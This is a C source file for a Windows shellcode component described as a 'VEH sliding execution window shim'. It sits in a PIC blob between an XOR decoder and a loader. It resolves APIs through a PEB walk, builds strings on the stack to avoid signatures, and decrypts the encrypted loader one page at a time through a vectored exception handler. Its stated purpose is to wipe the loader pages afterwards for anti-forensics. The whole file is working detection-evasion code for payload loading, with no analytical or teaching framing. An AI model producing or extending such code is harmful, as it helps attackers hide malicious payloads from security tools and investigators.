/**
 * VEH Sliding Execution Window Shim
 *
 * Sits between the XOR decoder and the loader in the PIC blob.
 * After decoding, execution falls here (offset 0 = VehShimEntry).
 *
 * The shim:
 *   1. Resolves VirtualProtect + Add/RemoveVectoredExceptionHandler via PEB
 *   2. Loader pages arrive per-page encrypted (only the shim was XOR-decoded)
 *   3. Installs VEH that decrypts/re-encrypts a 1-page RX window on demand
 *   4. Calls loader (first instruction faults, VEH decrypts page 0)
 *   5. On return, wipes loader pages and removes VEH
 *
 * The shim region stays RWX so the VEH handler always executes.
 * Strings are stack-built to avoid static signatures in decoded shim.
 *
 * VEH context struct is placed in .text via section attribute so
 * exe2h extraction captures it.
 */

#include <stdint.h>
#include <windows.h>
#include "peb.h"

#define RVA2VA(type, base, rva) (type)((ULONG_PTR)(base) + (rva))

/* --- Shared VEH context --- */
typedef struct {
    void     *loader_base;
    void     *pfnVirtualProtect;
    void     *last_rx_page;
    uint32_t  loader_size;
    uint32_t  page_encrypted;
    uint64_t  page_master_key;
} VEH_CTX;

/*
 * g_ctx lives at the end of .text so exe2h captures it.
 * Compiler uses RIP-relative addressing — works within same section.
 */
extern volatile VEH_CTX g_ctx;

/* Sentinel values — generator patches these in the blob */
#define SENTINEL_LOADER_OFFSET  0xDEAD0001
#define SENTINEL_LOADER_SIZE    0xDEAD0002
#define SENTINEL_VEH_MODE       0xDEAD0003
#define SENTINEL_PAGE_KEY_HI    0xDEAD0004
#define SENTINEL_PAGE_KEY_LO    0xDEAD0005

/* API type aliases */
typedef BOOL  (WINAPI *VP_fn)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef PVOID (WINAPI *AddVEH_fn)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef ULONG (WINAPI *RemVEH_fn)(PVOID);
typedef void* (*LoaderEntry_fn)(void*);

/* Forward declarations of helpers */
static LONG CALLBACK SlidingVehHandler(PEXCEPTION_POINTERS ep);
static void  xor_page(void *page_addr, uint64_t master_key, uint32_t page_index);
static void  *shim_find_dll(char *dll_name);
static void  *shim_get_export(void *base, char *api_name);
static int    shim_stricmp(const char *a, const char *b);
static int    shim_strcmp(const char *a, const char *b);


/* ================================================================
 * VehShimEntry — MUST be first function (offset 0 in .text).
 * Entered via fallthrough from XOR decoder. RCX = instance pointer.
 * ================================================================ */
void VehShimEntry(void *inst, void *shim_base) {
    volatile uint32_t ldr_off  = SENTINEL_LOADER_OFFSET;
    volatile uint32_t ldr_sz   = SENTINEL_LOADER_SIZE;
    volatile uint32_t veh_mode = SENTINEL_VEH_MODE;
    volatile uint32_t pk_hi    = SENTINEL_PAGE_KEY_HI;
    volatile uint32_t pk_lo    = SENTINEL_PAGE_KEY_LO;

    /* Stack-built strings — no static signatures in decoded shim */
    char s_k32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
    char s_vp[]  = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};

    /* shim_base passed via RDX by the decoder's lea rdx,[rip] trampoline */
    void *loader_base = (char*)shim_base + ldr_off;

    /* VirtualProtect from kernel32 (not forwarded) */
    void *k32 = shim_find_dll(s_k32);
    if (!k32) return;
    VP_fn pVP = (VP_fn)shim_get_export(k32, s_vp);
    if (!pVP) return;

    ULONG_PTR first_page  = (ULONG_PTR)loader_base & ~(ULONG_PTR)0xFFF;
    ULONG_PTR last_page   = ((ULONG_PTR)loader_base + ldr_sz - 1) & ~(ULONG_PTR)0xFFF;
    SIZE_T    protect_len  = last_page - first_page + 0x1000;
    DWORD     old;

    LoaderEntry_fn loader_entry = (LoaderEntry_fn)loader_base;

    if (veh_mode == 0) {
        /* Simple 2-stage: RW->RX on entire loader, then call */
        pVP((void*)first_page, protect_len, PAGE_EXECUTE_READ, &old);
        loader_entry(inst);
    } else {
        /* VEH sliding window with per-page encryption */
        char s_ntdll[]  = {'n','t','d','l','l','.','d','l','l',0};
        char s_addveh[] = {'R','t','l','A','d','d','V','e','c','t','o','r','e','d',
                           'E','x','c','e','p','t','i','o','n','H','a','n','d','l',
                           'e','r',0};
        char s_remveh[] = {'R','t','l','R','e','m','o','v','e','V','e','c','t','o',
                           'r','e','d','E','x','c','e','p','t','i','o','n','H','a',
                           'n','d','l','e','r',0};

        void *ntdll = shim_find_dll(s_ntdll);
        if (!ntdll) return;
        AddVEH_fn pAddVEH = (AddVEH_fn)shim_get_export(ntdll, s_addveh);
        RemVEH_fn pRemVEH = (RemVEH_fn)shim_get_export(ntdll, s_remveh);
        if (!pAddVEH || !pRemVEH) return;

        uint64_t page_key = ((uint64_t)pk_hi << 32) | (uint64_t)pk_lo;

        g_ctx.loader_base       = loader_base;
        g_ctx.loader_size       = ldr_sz;
        g_ctx.pfnVirtualProtect = (void*)pVP;
        g_ctx.last_rx_page      = 0;
        g_ctx.page_master_key   = page_key;
        g_ctx.page_encrypted    = 1;

        /* Loader pages are already per-page encrypted and RW
           (only the shim was decoded by the outer XOR). Ensure RW. */
        pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);

        PVOID veh_handle = pAddVEH(1, SlidingVehHandler);

        /* First instruction of loader faults — VEH decrypts page 0 */
        loader_entry(inst);

        if (veh_handle) pRemVEH(veh_handle);

        /* Wipe all loader pages — anti-forensics */
        pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);
        {
            uint8_t *w = (uint8_t *)first_page;
            for (SIZE_T z = 0; z < protect_len; z++) w[z] = 0;
        }

        /* Scrub VEH context */
        g_ctx.loader_base       = 0;
        g_ctx.loader_size       = 0;
        g_ctx.pfnVirtualProtect = 0;
        g_ctx.last_rx_page      = 0;
        g_ctx.page_master_key   = 0;
        g_ctx.page_encrypted    = 0;
    }
    /* Note: we can't drop X from the shim page here — the function epilogue
       (pop rbp / ret) still needs to execute on this page after we return.
       VEH is deregistered and g_ctx is scrubbed; the 4KB RWX shim page is
       the residual footprint. */
}

/* Per-page XOR: key = master_key ^ (page_index + 1) */
static void xor_page(void *page_addr, uint64_t master_key, uint32_t page_index) {
    uint64_t key = master_key ^ (uint64_t)(page_index + 1);
    uint64_t *p = (uint64_t *)page_addr;
    for (int i = 0; i < 4096 / 8; i++) {
        p[i] ^= key;
    }
}

/* ================================================================
 * VEH Handler — decrypts/re-encrypts a 1-page RX window across
 * the loader. Only one page of cleartext exists at any time.
 * ================================================================ */
static LONG CALLBACK SlidingVehHandler(PEXCEPTION_POINTERS ep) {
    DWORD old;

    if (ep->ExceptionRecord->ExceptionCode != (DWORD)0xC0000005)
        return EXCEPTION_CONTINUE_SEARCH;

    if (ep->ExceptionRecord->NumberParameters < 2 ||
        ep->ExceptionRecord->ExceptionInformation[0] != 8)
        return EXCEPTION_CONTINUE_SEARCH;

    ULONG_PTR fault = ep->ExceptionRecord->ExceptionInformation[1];
    ULONG_PTR base  = (ULONG_PTR)g_ctx.loader_base;
    ULONG_PTR end   = base + g_ctx.loader_size;

    if (fault < base || fault >= end)
        return EXCEPTION_CONTINUE_SEARCH;

    ULONG_PTR base_page  = base & ~(ULONG_PTR)0xFFF;
    ULONG_PTR fault_page = fault & ~(ULONG_PTR)0xFFF;
    uint32_t  fault_idx  = (uint32_t)((fault_page - base_page) >> 12);

    /* Re-encrypt + demote the old page */
    if (g_ctx.last_rx_page != 0 && (ULONG_PTR)g_ctx.last_rx_page != fault_page) {
        uint32_t old_idx = (uint32_t)(((ULONG_PTR)g_ctx.last_rx_page - base_page) >> 12);
        ((VP_fn)g_ctx.pfnVirtualProtect)(
            g_ctx.last_rx_page, 0x1000, PAGE_READWRITE, &old);
        xor_page(g_ctx.last_rx_page, g_ctx.page_master_key, old_idx);
    }

    /* Decrypt the faulting page (already RW) */
    xor_page((void *)fault_page, g_ctx.page_master_key, fault_idx);

    /* Set RX so execution can proceed */
    ((VP_fn)g_ctx.pfnVirtualProtect)(
        (void*)fault_page, 0x1000, PAGE_EXECUTE_READ, &old);

    g_ctx.last_rx_page = (void*)fault_page;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ================================================================
 * Minimal PEB walk + export resolver
 * ================================================================ */
static void *shim_find_dll(char *dll_name) {
    PPEB peb = GET_PEB();
    PPEB_LDR_DATA ldr = peb->Ldr;

    PLIST_ENTRY head  = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(
            (PBYTE)entry - (ULONG_PTR)&((PLDR_DATA_TABLE_ENTRY)0)->InMemoryOrderLinks);

        if (dte->DllBase != 0) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dte->DllBase;
            PIMAGE_NT_HEADERS nt  = RVA2VA(PIMAGE_NT_HEADERS, dte->DllBase, dos->e_lfanew);
            DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (rva != 0) {
                PIMAGE_EXPORT_DIRECTORY exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, dte->DllBase, rva);
                char *name = RVA2VA(char*, dte->DllBase, exp->Name);
                if (shim_stricmp(name, dll_name) == 0) {
                    return dte->DllBase;
                }
            }
        }
        entry = entry->Flink;
    }
    return 0;
}

static void *shim_get_export(void *base, char *api_name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (rva == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, base, rva);
    PDWORD adr = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
    PDWORD sym = RVA2VA(PDWORD, base, exp->AddressOfNames);
    PWORD  ord = RVA2VA(PWORD,  base, exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = RVA2VA(char*, base, sym[i]);
        if (shim_strcmp(name, api_name) == 0) {
            return RVA2VA(void*, base, adr[ord[i]]);
        }
    }
    return 0;
}

static int shim_stricmp(const char *a, const char *b) {
    while (*a && *b) {
        if ((*a | 0x20) != (*b | 0x20)) return 1;
        a++; b++;
    }
    return (*a != *b) ? 1 : 0;
}

static int shim_strcmp(const char *a, const char *b) {
    while (*a && *b) {
        if (*a != *b) return 1;
        a++; b++;
    }
    return (*a != *b) ? 1 : 0;
}

/* g_ctx in .text so exe2h captures it. Placed after all functions. */
__attribute__((section(".text"), used))
volatile VEH_CTX g_ctx = { 0, 0, 0, 0, 0, 0 };
